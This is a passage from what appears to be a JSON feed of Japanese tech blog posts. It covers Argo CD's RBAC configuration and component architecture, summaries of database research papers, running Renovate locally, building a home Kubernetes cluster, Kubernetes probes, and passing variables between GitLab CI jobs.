p, role:developer, *, *, dev/*/*, allow    p, role:maintainer, *, *, dev/*/*, allow    p, role:maintainer, *, *, prd/*/*, allow    g, developers, role:developer    g, maintainers, role:maintainer  scopes: \\"[groups]\\"▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetes06. argocd-server (argocd-apiserver)argocd-serverとは最後に、インフラレイヤーにあるargocd-serverです。『argocd-apiserver』とも呼ばれます。みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能し、他のコンポーネントと通信します\uD83E\uDD84仕組み(1) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。(2) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、ポーリング対象のリポジトリのマニフェストの差分を検出します。(3) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(4) application-controllerによる処理結果取得argocd-serverは、redis-serverから処理結果を取得します。(5) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(6) IngressコントローラーによるルーティングIngressコントローラーは、Ingressのルーティングルールを参照し、argocd-serverにルーティングします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。(8) IDプロバイダーによる認証フェーズ実施IDプロバイダー上で認証フェーズが完了します。argocd-serverは、ConfigMap (argocd-rbac-cm) を参照し、プロダクト用Cluster管理者に認可スコープを付与します。(9) argocd-serverによる認可フェーズ実施argocd-serverは、認可スコープに応じて、プロダクト用Cluster管理者がApplicationを操作可能にします。▶ NamespacedスコープモードについてapiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:  # 設定してはダメ  # application.namespaces: \\"*\\" # 全てのNamespaceを許可する。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: dev-foo-project  namespace: foospec:  # 設定してはダメ  # sourceNamespaces:  #  - \\"foo\\"これらにより、fooのNamespaceに属するArgoCDは、他のNamespaceにはアクセスできなくなります\uD83D\uDC4DInstallation - Argo CD - Declarative GitOps CD for Kubernetes(10) application-controllerによるマニフェストデプロイプロダクト用Cluster管理者は、ダッシュボード (argocd-server) を使用して、ClusterにマニフェストをSyncします。この時、Applicationを介してapplication-controllerを操作し、マニフェストをデプロイします。図では、App Of Appsパターンを採用したと仮定しています\uD83D\uDC68‍\uD83D\uDC69‍\uD83D\uDC67‍\uD83D\uDC66▶ App Of Appsパターンについて07. アーキテクチャのまとめ今までの全ての情報をざっくり整理して簡略化すると、ArgoCDは以下の仕組みでマニフェストをデプロイすることになります\uD83D\uDC4708. おわりにArgoCDによるデプロイの仕組みの仕組みをもりもり布教しました。ArgoCDは、UIが使いやすく、仕組みの詳細を知らずとも比較的簡単に運用できるため、ユーザーフレンドリーなツールだと思っています。もしArgoCDを使わずにマニフェストをデプロイしている方は、ArgoCDの採用をハイパー・ウルトラ・アルティメットおすすめします\uD83D\uDC4D謝辞ArgoCDの設計にあたり、以下の方に有益なプラクティスをご教授いただきました。@yaml_villager さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook: Kubernetes Automation in Practice (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","isoDate":"2023-05-02T05:42:57.000Z","dateMiliSeconds":1683006177000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"現代のクエリオプティマイザの基礎となる技術をまとめた論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/15_query_optimization_overview","contentSnippet":"この記事の趣旨1998年に発表されたクエリオプティマイザの基礎としてとくに重要な手法をまとめた論文を読みました。An Overview of Query Optimization in Relational Systems著者についてSurajit Chaudhuriによる論文Microsoft所属の研究者でRDBMSの研究を行なっており、近年ではCloudにおけるDBMSの研究を行なっている。概要RDBMSが提案された1970年代からクエリ最適化は大規模で幅の広く研究が行なわれてきた。この論文では執筆当時(1998年)までの重要な研究の基礎を説明している。手法探索空間統計情報とコストの推定列挙アルゴリズムアルゴリズムについて説明している。論文内では拡張可能なオプティマイザとして、StarburstとVolcano/Cascadeの2種類のオプティマイザの詳細を論じている。最新(当時)の最適化リアライズドビューについて説明している。作業時間read31:4031:40author33:402:00summary52:5519:15感想ベクトル化やパラレルジョインで扱われていたVolcanoオプティマイザの端に触れることが出来ました。内容としては基礎的な内容が多いものの、知らない概念もいくつかあり引用している論文も読みたいです。クエリ最適化の基礎を学ぶのに非常にいい内容でした。","isoDate":"2023-05-02T01:54:29.000Z","dateMiliSeconds":1682992469000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSとクライアント間におけるデータ転送を最適化する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/14_data_transfer_between_server_and_client","contentSnippet":"この記事の趣旨2017年に出版されたリモートDBMSとクライアント間の大量データ転送を最適化する手法を提案する論文を読みました。Don’t Hold My Data Hostage – A Case For Client Protocol Redesign著者についてMark Raasveldt、Hannes Muhleisenらのグループによる論文。いずれもCentrum Wiskunde & Informaticaの所属で、DuckDBのCxO。DBMSと分析システムにおけるパフォーマンス最適化を研究している。問題意識DBMSからクライアントプログラムに大量のデータを転送することは一般的なタスクである。例えばRやPythonなどを用いた分析システムはしばしばデータベース・インターフェースを利用してデータの取得を行なっている。一方でネットワーク越しにデータを転送することはレイテンシを増加させ、転送時間を長引かせる要因である。そのため分析用途で大量のデータ転送を避け、一部のデータをサンプルとして利用するに止まることが多い。このアプローチはパフォーマンスの低下を押さえられるものの、分析や機械学習の精度を下げることに繋がる。とくに既存のクライアントではネットワークによるレイテンシとスループットの制限に大きな影響を受けパフォーマンスを劣化させる。この問題はデータベースが別マシンやクラウドで動作するときにより大きな問題となる。手法本論文では既存のシリアライズ手法と圧縮手法によるパフォーマンスへの影響を計測し、新しいプロトコルとして以下の特性を持つ手法を提案している。1. チャンク毎のデータ転送と(デ)シリアライゼーション1. ヒューリスティックによる圧縮方法の決定1. text/binaryによるカスタムシリアライゼーションを使用する1. NULL終端によるテキストの取り扱い実験結果提案手法を実装したMonetDB(表内ではMonetDB++)とPostgreSQL(表内ではPostgreSQL++)を既存のDBMSやnetcatと比較することで評価を行なっている。TCP-Hのlineitem、American Community Survay、Airline On-Time Statisticsの3つのデータセットで評価を行なったところ、ローカル通信における非圧縮netcatを除き殆どのケースでMonetDB++系が最良のパフォーマンスを発揮し次点でPostgreSQL++系が優れた結果を残している。Table 10Table 11Table 12PostgreSQLに比べMonetDBが優れている理由はPostgreSQLの行指向データを列指向に変換するコストのためである。作業時間read31:2131:21author35:384:17summary70:1334:35感想論文出版時にはTPC/IPプロトコルが前提でQuic登場前のため、ネットワークプロトコル自体は考慮されていない。現在であればTPC/IPとQuicに適合した手法の比較が行なわれると思うので気になるところ。","isoDate":"2023-05-01T03:34:18.000Z","dateMiliSeconds":1682912058000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"SQL ServerにおけるUDF最適化の論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/13_sql_server_udf_optimization","contentSnippet":"この記事の趣旨2017年に発表されたSQL ServerでUDFを最適化しているFroidという手法についての論文を読みました。Froid: Optimization of Imperative Programs in a Relational Database著者についてKarthik Ramachandra、Kwanghyun Park、K. Venkatesh Emani、Alan Halverson、Cesar Galindo-Legaria、Conor Cunninghamのグループによる論文。ほとんどの著者はMicrosoftに所属しており、いずれもトランザクショナルワークロードでのRDBMSの最適化や分析ワークロードにおけるRDBMS最適化の研究をしている。問題意識RDBMSではSQLによるデータ処理アプローチと、UDFやストアドプロシージャなどによる命令型のデータ処理アプローチを提供している。SQLによるデータアクセスは高度に最適化されてきた一方で、命令型のデータ処理は非効率なため性能を阻害し利用を禁止している組織すらある。UDFによるデータアクセスは非効率であるものの、SQLに比べ下記のような利点を提供するため幅広く利用されているのも事実である。1. SQL間でコードの再利用方法を提供する1. 複雑なビジネスロジックやMLアルゴリズムなどSQLでは難しい表現を可能にする1. 単純なSQLの組み合わせのため、ユーザーの意図が明確に表現できるこれらのメリットを享受するためにRDBMSにおける命令型データアクセス手法のパフォーマンスを向上しする必要があった。手法提案手法であるFroidはMicrosoft SQL Serverにおける命令型コードのパフォーマンス向上の手法として、UDFを複雑なサブクエリとしてみなすアプローチを取っている。UDFを構成する命令はDECLARE、SELECT、IF/ELSE、RETURN、他のUDF、リレーショナルオペレーションの6つに分ることができる。提案手法ではこれらの命令を一般的なT-SQLに置き換え、Apply演算により一つの関係式に結合する方法で実現している。Table 1命令が一般SQLに置き換えられることでUDFに対して、SQLに用いられていた高度な最適化を導入することが出来る。また提案手法ではい以下の理由から、SQLとして命令を置換するときにクエリ最適化時に行なうのではなくバインド時に置換をしている。1. 実際のワークロードでの実験ではほぼ全てのケースでバインド時のほうが性能がよかった1. クエリオプティマイザの変更が不要1. バインディング時に特定の最適化を行なえるとくにクエリオプティマイザの変更はSQL Serverが商用データベースなため重要であった。作業時間read28:5028:50author32:103:20summary57:0024:50","isoDate":"2023-04-28T02:29:05.000Z","dateMiliSeconds":1682648945000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSの歴史とNewSQL","link":"https://zenn.dev/nnaka2992/articles/history_of_db_and_newsql","contentSnippet":"この記事はDBMSの登場以前から現代のDBMSを取り巻く環境までを振り返ることで、なぜNewSQLが必要とされ登場したのかをまとめます。 おことわり筆者はあくまでDBMSユーザーであり、研究者ではないため内容は個人の見解です。また対象読者はある程度DBMSに関わりがあり、OLTPやOLAP、列指向や行指向といった基本的な単語を理解しているものとします。またNewSQLの技術的詳細はスコープ外とします。 DBMS以前データベースという言葉は1950年代に米軍が情報基地を集約したことに由来します。一方で学術的なデータベースの起源はW. C. McGeeが1959年に発表...","isoDate":"2023-04-26T14:28:19.000Z","dateMiliSeconds":1682519299000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"中間結果が莫大になるときの結合を最適化する最悪ケース最適化結合をRDBMSに適応する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/12_worst_case_optimal_join","contentSnippet":"この記事の趣旨2018年に発表された分析ワークロードなどで発生しがちな最終結果に比べ、非常に大きな中間結果を作成してしまうクエリを多方向結合で最適化する論文を読みました。Adopting Worst-Case Optimal Joins in Relational Database Systems著者についてMichael Freitag、Maximilian Bandle、Tobias Schmidt、Alfons Kemper、Thomas Neumannによるグループの論文いずれの著者もDBMSにおける最適化を中心に研究しており、それぞれ分析ワークロードにおける最適化や最新のハードウェアにおける最適化などを研究している。問題意識従来のRDBMSにおける結合処理のほとんどはバイナリ結合に依存して複数のリレーションにまたがるクエリを処理してきた。数十年に渡る研究によりバイナリ結合は幅広い柔軟性と優れた性能を発揮するようになった。その一方でバイナリ結合による実行計画は特定のワークロードでは最適ではないケースを示すことが知られている。主な原因として実際のクエリ結果に比べて非常に大きな中間結果を生成するためである。とくにPK以外のキーによる結合が多くなる分析ワークロードではそのような状態を避けることが難しく、またグラフ分析のようなクエリパターンでも多く見られる。近年の論理的な進歩により中間結果の列挙を避ける多方向結合のアルゴリズムが開発可能になった。この手法はバイナリ結合計画より優れた実行時間を保証できるため、RDBMSの堅牢性を大幅に向上させる可能性を持っている。しかし現状最悪ケース最適化結合アルゴリズムでは以下のような問題を抱えている。1. 膨大なストレージとメンテナンスを必要とする結合に参加出来るカラムを含むインデックスを必要とする。1. RDBMSは挿入と更新のサポートが必要なものの、既存のアルゴリズムは高価な事前計算を必要とする。そのため本論文は以下の制約を満たすアプローチを提案している1. 多方向結合が有益な場合のみ多方向結合を使用するオプティマイザを必要とする。1. 実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。手法提案手法では比較ベースではなくハッシュベースの結合のため、2の「実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。」という要素の考慮を除いている。またオプティマイザについては既存のコストベースのものを拡張し適応している。提案手法では潜在的に成長している結合のカスケードを最悪の場合の最適結合に置き換えることで、最適化されたバイナリ結合計画を洗練させるヒューリスティックなアプローチを提案している。通常の結合順序最適化で使用されるのと同じカーディナリティ推定値に基づいて、中間テーブルが膨大になる結合を特定する。作業時間read22:1322:13author25:483:35summary52:5826:50感想とても難しい内容に感じてしまい、殆ど頭を通りすぎてしまった気がする。今まで最適化は触れずに来たため、理解が浅い領域だった。よくよく考えるとDBMSの話しに最適化が登場するのはあたりまえなので、今後はその方面にも触れて行きたい。","isoDate":"2023-04-26T02:06:46.000Z","dateMiliSeconds":1682474806000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"gptstudio = ChatGPT + RStudioがおもしろい","link":"https://blog.atusy.net/2023/04/26/gptstudio/","contentSnippet":"ChatGPTを使ってRStudio上でのコーディングを支援するgptstudioパッケージが登場しました。姉妹製品に[gpttoools]パッケージもあります。利用にはOpenAIのAPI Keyが必要にです。生成するトークンに対する従量課金制ですが、$5のお試し枠がついてます。","isoDate":"2023-04-26T00:00:00.000Z","dateMiliSeconds":1682467200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"マルチコアメインメモリにおけるソートジョインとハッシュジョインのパフォーマンスを検証した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/11_join_performance_comparison","contentSnippet":"この記事の趣旨2013年に発表された\\"Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited\\"という論文を読みました。当時最新のアルゴリズムとハードウェアにおける、ソートとハッシュによる結合のパフォーマンスを比べた論文です。Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited著者についてCagri Balkesen、Gustavo Alonso、Jens Teubner、M. Tamer Ozsuらのグループによる論文いずれもDBMSにおけるクエリ最適化やビッグデータにおけるパフォーマンスを研究している。またGustavo Alonsoはハードウェアや分散システムもメインのフィールドとしている。問題意識DBMSにおいて常にソートマージとハッシュ結合の性能比較が行われており、最新の研究ではSIMDやNUMAへの適正に基づいてソートマージがより優れていると結論づけられていた。しかしこれらの分野は常に研究が重ねられ、過去の検証時には登場していなったハッシュ結合の最適化手法が生れた。この論文ではそれらを適用し再度ソートマージとハッシュ結合の性能比較を行なう。手法本論文では以下に分けて結合手法の評価を行なっている。1. ソートフェーズの評価SIMDソートアルゴリズムとC++のSTLソートアルゴリズムを比較している。マージフェーズの評価入力サイズの調整によるマージフェーズの最適化パーマンスを検証している。ソートマージジョインにおける影響要因の特定結果結合対象のデータサイズに拘わらずハッシュによる結合がソートベースの結合のパフォーマンスを上回っている。Figure 14ソートマージによる結合は入力サイズが著しく大きくなったときのみハッシュ結合のパフォーマンスに近づく。Figure 15ソートマージ、ハッシュ結合におけるデータの偏りはパフォーマンスに大きな影響を及ぼさなかった。Figure 16いずれのアルゴリズムも物理的なコア数では線形にスケールした。Figure 17作業時間read23:1123:11author27:093:58summary60:1232:57","isoDate":"2023-04-24T02:23:54.000Z","dateMiliSeconds":1682303034000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"RDBでの結合手法を比較した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/10_join_method_comparison","contentSnippet":"この記事の趣旨2016年に発表された\\"An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory\\"という論文を読みました。様々な結合手法を包括的に比較した論文でどのような結合方法がどのような時に適しているかを示しています。An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory著者についてStefan Schuh、Xiao Chen、Jens Dittrichのグループによる論文。いずれもDBMSや分析システム、Hadoopなどにおける検索高速化・最適化の研究を行なっている。問題意識関係結合はほとんど全てのクエリプランにおいて中核をなす処理であり、定期的に研究・改良され再検討されてきた。新たな手法が提案され実験を行なわれるものの、それぞれ結果において比較を困難にする要素や幾らかの矛盾を孕んでいた。例えば同じハッシュベースの結合アルゴリズムの比較でも実装が異なったり、複数の論文でパフォーマンス比較で正反対の結果を示しているためである。そのため単純に論文執筆時点で最も高速な結合アルゴリズムを結論づけることが困難であった。手法本論文では結合方法を以下の3つに分類した1. パーティションベースハッシュジョインパーティションに分割し結合する手法。ハッシュテーブルの構築と結合されるデータの探索のキャッシュミスを最小にする事を目的としている。非パーティションベースハッシュジョインパーティションテーブルを構築しながら結合を行なう手法で、マルチスレッドと順番に依存しない実行によりキャッシュミスのパフォーマンス劣化を隠蔽している。ソートマージジョインSIMDによりベクトル化される。検証ではこれらの結合方法を以下の3つのテストで使用するために、全部で13のアルゴリズムを検証している。1. ブラックボックス比較ブラックボックス的に比較する。ホワイトボックス比較ブラックボックス比較で検証する結合方法に先行研究で示された最適化を施した上で比較を行なう。パラレルラディックスジョイン比較Table 2結果パーティション結合の一種であるリモート書込みを排除したCPR系アルゴリズムは小さな入力に対して有効ではないスケールの大きい結合ではとくに理由が無い場合、パーティションベースのジョインを利用する大きなサイズのページを利用するソフトウェアライトコンバインバッファ()を利用するパーティションジョインでは適切なパーティションビットを利用するできるかぎりシンプルなアルゴリズムを利用するNUMAを考慮したアルゴリズムを利用する実行時間とクエリ時間は同一ではない作業時間read31:3431:34author35:183:46summary77:5042:32","isoDate":"2023-04-23T14:16:28.000Z","dateMiliSeconds":1682259388000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"コンパイルとベクトル化による最適化のパフォーマンスを比較した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/9_compile_vs_vectorize_performance","contentSnippet":"この記事の趣旨2018年に発表された\\"Everything You Always Wanted to Know AboutCompiled and Vectorized Queries But Were Afraid to Ask\\"という論文を読みました。最新のクエリエンジンの特性をまとめ、どのようなワークロードに向くのかという指針を示すないようです。Everything You Always Wanted to Know About Compiled and Vectorized Queries But Were Afraid to AskTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Boncz著者についてTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Bonczのグループによる論文。いずれも大規模データにおけるクエリパフォーマスや最適化に関する研究を行なっている。問題意識分析ワークロードに向いた最新のクエリエンジンはベクトル化またはデータ中心のコード生成に基づいている。どちらのモデルも従来のエンジンに比べオーバーヘッドが少く、非常に効率的なものの概念的には大きく異なっている。この2つのモデルの違いは、DBMSの実行エンジンのソースコードの構成とその性能特性を決定する基本的なもので、クエリ実行モデルを超える多くの設計で異なる。本論文はことなる2つのモデルを再実装し、環境差異のないマシンで実行することでそれぞれのモデルがどのように違うのか。どのような用途に最適なのかを検証している。手法検証手法は著者らがC++で再実装したデータ中心モデルの「Taper」とベクトル化中心の「Tectorwise」を同一のマシンでパフォーマンス検証を行っている。検証項目は以下から成る1. インメモリOLAPワークロードでのマイクロアーキテクチャ分析1. SIMDの利点の検証1. マルチコアCPUにおけるクエリ並列化1. 異なるハードウェアでのパフォーマンス結果インメモリOLAPワークロードでのマイクロアーキテクチャ分析Figure 3: Performance – TPC-H SF=1, 1 threadSIMDの利点の検証SIMDを評価するにはTectorwiseのみを用いた。SIMDではスカラーなデータをベクトルに変換するペナルティは少く、最大8.4倍の性能向上が確認された。Figure 6: Scalar vs. SIMD Selection in TectorwiseマルチコアCPUにおけるクエリ並列化異なるハードウェアでのパフォーマンスIntel Skylake、Intel Knights Landing、AMD Ryzenで対照実験を行なったものの、いずれのハードウェアでもTyper、Tectorwiseともに有効に動作した。作業時間read29:2629:26author33:233:57summary76:3742:44感想VoectorwiseとHyperのいずれを使うべきか。どちらが優れているかといった疑問に答えるないようだった。","isoDate":"2023-04-21T01:45:06.000Z","dateMiliSeconds":1682041506000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Renovateをローカルで動かす","link":"https://kechigon.hatenablog.com/entry/2023/04/20/140449","contentSnippet":"Renovateには様々な実行方法がありますが。ここではローカルで動かす方法について説明します。Renovateをクローンするhttps://github.com/renovatebot/renovateからクローンしましょう。これ以降はクローンしたリポジトリのルートディレクトリで作業します。実行環境コンテナ.devcontainer/Dockerfileをビルドします。docker build -f .devcontainer/Dockerfile -t renovatebot_local .Renovateの依存パッケージをインストールdocker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app renovatebot_local yarnローカル実行時のオプションドキュメントを参考に、引数を与えてください。ログレベルdebugでGitLabリポジトリに対して実行する場合は、以下のようになります。例：docker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app -e LOG_LEVEL=debug -e GITHUB_COM_TOKEN=*** renovatebot_local yarn start --platform gitlab --token *** {リポジトリ}※{リポジトリ}のところはユーザー名/リポジトリ名のような感じです。","isoDate":"2023-04-20T05:04:49.000Z","dateMiliSeconds":1681967089000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/8_counter_control_flow_divergence_in_compiled_query_pipelines","contentSnippet":"この記事の趣旨2020年に提案された\\"Make the most out of your SIMD investments: counter control flowdivergence in compiled query pipelines\\"という論文を読みました。SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文です。Make the most out of your SIMD investments: counter control flow divergence in compiled query pipelinesHarald Lang, Linnea Passing, Andreas Kipf, Peter Boncz, Thomas Neumann, Alfons Kemper著者についてHarald Lang、 Linnea Passing、 Andreas Kipf、 Peter Boncz、 Thomas Neumann、 Alfons Kemperのグループによる研究いずれも最新のアーキテクチャでのクエリ最適化やデータ分析における検索手法などを研究している。問題意識CPUの発展にともないあたらしいCPUアーキテクチャが登場した。Single Instruction Multiple Data(SIMD)ではRDBはSIMDによるベクトル処理能力の向上により、クエリコンパイラの実行パイプライン全体をベクトル化して高度なデータ並列性の恩恵を受けることが出来るようになった。一方でクエリ全体をベクトル化して実行することで、SIMDによるクエリ評価が忙しくなる。SIMD評価で結果に寄与しない評価が単純にオーバーヘッドとなってしまう。手法本論文ではリフィルアルゴリズムとそのアルゴリズムをクエリパイプラインプランに統合する手法で上記の問題の解決を試みている。リフィルアルゴリズムは基本的に新しい要素を宛先レジスタの希望する位置にコピーするアルゴリズムで、メモリからレジスタとレジスタからレジスタへのコピーの2パターンが存在する。クエリパイプラインプランに統合するリフィル戦略ではConsume EverythingパターンとPartial Consumeパターンが存在する。Consum Everything戦略は、タプルをバッファリングするために使用される追加のベクターレジスタを割り当てる方法で利用率が低い場合、オペレータはこれらのタプルの処理を延期する。つまり、この反復ではボディは実行されず(条件が満たされない場合)、代わりにアクティブなタプルがこれらのバッファレジスタに移動することになる。Partial Consume戦略ではconsume()コードを入力の一部に適用する方法で、制御フローを前のオペレータに戻し、アクティブなデータ断片のみをベクトルレジスタに残すことで実行を延期している。作業時間read29:4029:40author33:404:00summary60:0426:36感想前回に引続き個人的には難しいと感じる論文だった。2000年前後の提案にくらべ、2015年前後の論文ではハードウェアアーキテクチャを中心とした手法がピックアップされている。単純に自分の知識不足、理解力不足なので勉強するしかない。","isoDate":"2023-04-20T02:00:20.000Z","dateMiliSeconds":1681956020000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Markdownのコードブロックとかテキストの文脈に合わせて背景色を変えるtsnode-marker.nvimを作った","link":"https://blog.atusy.net/2023/04/19/tsnode-marker-nvim/","contentSnippet":"2023/04/19のVim駅伝記事です。Neovimはtreesitterを使ってテキストファイルをパースする機能を備えています。代表的な用例は、パース結果に基くシンタックスハイライトですが、文法に従った範囲を取得できるので、コードの折り畳みや、テキストオブジェクトにも活躍します。","isoDate":"2023-04-19T00:00:00.000Z","dateMiliSeconds":1681862400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"NUMAアーキテクチャでのクエリ最適化に関する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/7_numa_aware_query_evaluation_framework","contentSnippet":"この記事の趣旨\\"Morsel-Driven Parallelism: A NUMA-Aware Query Evaluation Framework forthe Many-Core Age\\"という2014年に発表された、多コアサーバにおけるクエリ最適化手法をあつかった論文を読みました。[Morsel-Driven Parallelism: A NUMA-Aware QueryEvaluation Framework for the Many-Core Age](https://15721.courses.cs.cmu.edu/spring2023/papers/07-scheduling/p743-leis.pdf)Viktor Leis, Peter Boncz, Alfons Kemper, Thomas Neumann著者についてViktor Leis、 Peter Boncz、 Alfons Kemper、Thomas Neumannのグループによる研究いずれもデータベースと 高速化かを中心に研究している。問題意識コンピュータアーキテクチャの進化にともない、二つのあたらしい問題が生じた。多コアを利用するためにクエリを数百のスレッドに均等に分散させるそれをNUMA(Non-Uniform Memory Access)による順序通りではないメモリアクセスで実現する必要がある。これらの要因からplanベースの並列処理による不可分散とコンテキストスイッチとボトルネックが問題になりスケールが難しかった。NUMAによってデータとアクセススレッドがどのチップに配置されるかによって、データ項目のアクセスコストが異なるため、コンピュータ自体がネットワークになっており、多コア並列化では、RAMやキャッシュ階層を考慮する必要がある。この論文ではMoral-drivenクエリ実行フレームワークを提案している。手法提案手法は並列クエリ処理のため、morselドリブンクエリ評価フレームワークを提示した。これはメニーコア時代の分析クエリ性能の主要なボトルネックである負荷分散、スレッド同期、メモリアクセス局所性およびリソース弾力性を解決することを目的としている。ベースとなるアイデアは以下の2つに分けられる。メモリ上のデータをmorselと呼ばれる小さなバッチに分割し、バッチごとに処理を実行したあとにそれぞれの処理結果をグローバルハッシュテーブルとしてまとめる。Figure 3: NUMA-aware processing of the build-phaseディスパッチャと呼ばれる並行パイプライン制御を行ない、ワーカースレッドをタスクに割り当てるFigure 5: Dispatcher assigns pipeline-jobs on morsels to threads depending on the coreまとめとして著者はきめ細かいスケジューリング、完全演算子並列化、低オーバーヘッド同期、NUMA対応スケジューリングの原理を用いて、他のシステムでもメニーコアスケーリングを改善できると示唆している。作業時間read28:3628:36author32:453:09summary60:3727:52感想近現代のサーバアーキテクチャで主流になっているNUMAでのクエリパフォーマンス向上のための論文のため、古典的なものに比べ概念が難しいものが多い。もう少し理解を深めたい。","isoDate":"2023-04-18T01:01:35.000Z","dateMiliSeconds":1681779695000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"おうちk8sクラスターを構築していて詰まったところ","link":"https://kechigon.hatenablog.com/entry/2023/04/17/174444","contentSnippet":"おうち Kubernetes インターンを参考に機材調達->OSインストール->kubeadamでクラスター構築と一通りやってみたので、トラブったところと解決策を共有します。USBメモリRaspberry PiにOSをインストールする際に、SDカードの性能が悪いと失敗します。私は安物で済ませようとした結果、三枚目でようやく成功しました。またインストール後も、ディスクの読み書き速度は全体のパフォーマンスに影響を与えるので、性能にはこだわるべきです。以下のサイトなどを参考に選びましょう。https://www.kingston.com/jp/blog/personal-storage/memory-card-speed-classeshttps://osusumepc.com/raspberry-pi-microsd/cgroups の Memory Subsystem を有効化私がインストールしたOSでは、cgroups の Memory Subsystem がデフォルトで無効化されているため、/boot/firmware/cmdline.txtに下記を追加する必要がありました。cgroup_memory=1 cgroup_enable=memoryしかし、編集し再起動しても有効化されませんでした。原因は改行を入れて追加していたことでした。改行せず行末に追加するのが正しいです。","isoDate":"2023-04-17T08:44:44.000Z","dateMiliSeconds":1681721084000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"コンテナイメージのマルウェア検出とその実用性について","link":"https://speakerdeck.com/kyohmizu/kontenaimezinomaruueajian-chu-tosonoshi-yong-xing-nituite","contentSnippet":"3-shake SRE Tech Talk #5 ~ コンテナセキュリティ最前線 の資料です。\\rhttps://3-shake.connpass.com/event/277945/","isoDate":"2023-04-12T04:00:00.000Z","dateMiliSeconds":1681272000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetes の Probe の仕組みと考慮点","link":"https://zenn.dev/toversus/articles/5d1292160f5035","contentSnippet":"!Kubernetes 1.26 時点の話で、以降のマイナーバージョンで改善されている可能性があります。Kubernetes には、ワークロードの正常性を確認するための Probe という仕組みがあり、Liveness / Readiness / Startup Probe が用意されています。kubelet (Kubernetes のノード上で動作するエージェント) は、ワークロードに対して TCP Socket / HTTP GET / gRPC / Exec の中から指定されたチェックを定期的に実行します。それぞれの Probe の特性を理解して使い分けないとサービスに影響...","isoDate":"2023-04-10T02:20:29.000Z","dateMiliSeconds":1681093229000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"GitLab CI で artifacts:reports:dotenv を使って Job をまたいで変数を渡す","link":"https://blog.1q77.com/2023/04/gitlab-ci-artifacts-report-dotenv/","contentSnippet":"GitLab CI である Job で変数を定義して、それを後続の Job でも使いたいなと思って調べていたらartifacts:reports:dotenv にたどり着いたのでメモ。使用例stages: - stage1 - stage2 - stage3 - stage4job1: stage: stage1 script: - echo \\"MY_VAR1=first-variable\\" >> dot.env artifacts: expire_in: 30 mins reports: dotenv: dot.env# job1 と job2 で使用するファイル名が重複しても別物なので問題ないjob2: stage: stage2 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=second-variable\\" >> dot.env artifacts: 